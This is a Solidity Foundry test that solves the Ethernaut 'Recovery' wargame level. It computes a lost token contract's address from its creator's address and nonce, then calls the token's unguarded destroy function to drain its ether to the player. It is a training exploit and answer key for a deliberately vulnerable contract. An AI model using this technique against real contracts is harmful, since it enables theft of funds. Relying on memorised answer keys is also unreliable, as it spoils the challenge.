pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/core/Ethernaut.sol";
import "../src/ethernaut/17-Recovery/RecoveryFactory.sol";
import "../src/ethernaut/17-Recovery/Recovery.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
        // init 1 eth for player
        vm.deal(address(this), 1 ether);
        console.log("player balance: ", address(this).balance);
    }

    function testAttck() public {
        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(factory);
        // slove 
        address token=address(
            uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01)))))
        );
        console.log("token: ", token);
        SimpleToken simpleToken = SimpleToken(payable(token));
        console.log("player balance: ", address(this).balance);
        simpleToken.destroy(payable(address(this)));
        console.log("player balance: ", address(this).balance);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
